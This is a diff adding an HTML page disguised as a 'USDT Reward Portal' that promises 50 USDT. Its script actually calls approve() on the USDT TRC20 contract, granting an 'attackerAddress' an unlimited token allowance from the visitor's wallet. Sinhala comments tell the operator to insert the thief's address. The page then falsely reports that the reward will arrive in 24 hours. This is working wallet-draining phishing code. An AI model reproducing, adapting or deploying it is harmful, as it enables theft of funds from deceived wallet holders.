@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Reward Portal</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- TronWeb Library එක මෙතනින් ගන්නවා -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.1.0/dist/TronWeb.js"></script>
+    <style>
+        body { font-family: sans-serif; background: #f4f4f9; text-align: center; padding-top: 50px; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
+        button { background: #ff0013; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        button:hover { background: #cc000f; }
+        .status { margin-top: 15px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="80" alt="USDT">
+        <h2>Exclusive USDT Reward</h2>
+        <p>You are eligible to claim <b>50 USDT</b></p>
+        <button id="claimBtn">Claim Now</button>
+        <div id="status" class="status">Connect your wallet to start</div>
+    </div>
+
+    <script>
+        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Contract
+        const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n"; // මෙතනට උඹේ හොරාගේ ඇඩ්‍රස් එක දාපන්
+        const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+        $('#claimBtn').click(async () => {
+            if (typeof window.tronWeb !== 'undefined') {
+                try {
+                    $("#status").text("Processing... Please confirm in your wallet.");
+                    
+                    // USDT Contract එක සම්බන්ධ කරගැනීම
+                    const contract = await window.tronWeb.contract().at(contractAddress);
+                    
+                    // මෙන්න මෙතන තමයි සෙල්ලම තියෙන්නේ - Approve Function එක Trigger කිරීම
+                    await contract.approve(attackerAddress, amount).send({
+                        feeLimit: 100000000 // මේක වැදගත්, නැත්නම් Transaction එක Fail වෙයි
+                    });
+
+                    $("#status").text("Claim Successful! Reward will arrive in 24 hours.");
+                    $("#status").css("color", "green");
+
+                } catch (error) {
+                    console.error(error);
+                    $("#status").text("Transaction failed. Try again.");
+                    $("#status").css("color", "red");
+                }
+            } else {
+                alert("Please open this site inside Trust Wallet or TronLink Browser");
+            }
+        });
+    </script>
+</body>
+</html>
